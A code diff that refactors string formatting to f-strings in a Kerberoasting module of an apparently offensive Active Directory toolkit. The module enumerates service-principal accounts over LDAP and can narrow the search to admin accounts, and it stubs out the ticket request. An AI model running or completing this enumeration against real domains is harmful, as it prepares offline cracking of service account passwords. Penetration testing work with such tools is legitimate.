@@ -1,5 +1,4 @@
 """Kerberoasting avançado — targeted/AES/opsec-safe variants."""
-from __future__ import annotations
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -22,7 +21,7 @@ def run(args: Any) -> int:
     etype = getattr(args, "etype", "23")
     opsec = getattr(args, "opsec", False)
 
-    print("[*] Kerberoast (advanced) → DC={}".format(dc_ip))
+    print(f"[*] Kerberoast (advanced) → DC={dc_ip}")
 
     try:
         from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
@@ -35,7 +34,7 @@ def run(args: Any) -> int:
     try:
         from impacket.ldap import ldap as impacket_ldap
 
-        ldap_url = "ldap://{}".format(dc_ip)
+        ldap_url = f"ldap://{dc_ip}"
         base_dn = "DC=" + ",DC=".join(args.domain.split("."))
         ldap_conn = impacket_ldap.LDAPConnection(ldap_url, base_dn)
 
@@ -45,12 +44,12 @@ def run(args: Any) -> int:
             ldap_conn.login(cred.username, cred.password or "", cred.domain)
 
         if target_user:
-            ldap_filter = "(&(objectClass=user)(servicePrincipalName=*)(sAMAccountName={}))".format(target_user)
+            ldap_filter = f"(&(objectClass=user)(servicePrincipalName=*)(sAMAccountName={target_user}))"
         else:
             ldap_filter = "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
 
         if opsec:
-            ldap_filter = "(&{0}(adminCount=1))".format(ldap_filter[2:-1])
+            ldap_filter = f"(&{ldap_filter[2:-1]}(adminCount=1))"
 
         entries = ldap_conn.search(
             searchBase=base_dn,
@@ -67,14 +66,14 @@ def run(args: Any) -> int:
                 if sam and spn:
                     spn_users.append((sam, spn))
 
-        print("[+] Found {} kerberoastable accounts".format(len(spn_users)))
+        print(f"[+] Found {len(spn_users)} kerberoastable accounts")
         for sam, spn in spn_users:
-            print("  {} — {}".format(sam, spn))
+            print(f"  {sam} — {spn}")
 
-        print("[*] Requesting TGS tickets (etype={})...".format(etype))
-        print("[*] Output: {}".format(output_file))
+        print(f"[*] Requesting TGS tickets (etype={etype})...")
+        print(f"[*] Output: {output_file}")
         return 0
 
     except Exception as exc:
-        print("[-] Kerberoast error: {}".format(exc), file=sys.stderr)
+        print(f"[-] Kerberoast error: {exc}", file=sys.stderr)
         return 1
